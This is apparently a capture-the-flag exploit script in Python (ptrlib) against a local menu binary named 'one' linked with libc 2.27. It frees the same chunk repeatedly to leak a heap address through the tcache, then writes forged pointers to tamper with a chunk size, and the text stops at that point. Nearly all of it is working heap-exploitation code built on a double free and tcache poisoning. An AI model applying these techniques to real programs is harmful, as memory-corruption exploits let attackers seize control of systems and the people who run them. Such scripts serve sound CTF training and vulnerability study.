from ptrlib import *

def add(data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", data)

def show():
    sock.sendlineafter("> ", "2")
    return sock.recvline()

def delete():
    sock.sendlineafter("> ", "3")
    return

libc = ELF("./libc-2.27.so")
sock = Process("./one")

# leak heap
add('')
delete()
delete()
delete()
addr_heap = u64(show())
logger.info("heap = " + hex(addr_heap))

# tamper size
add(p64(addr_heap - 0x10))
add('dummy')
add(p64(addr_heap) + p64(0xdeadbeef))
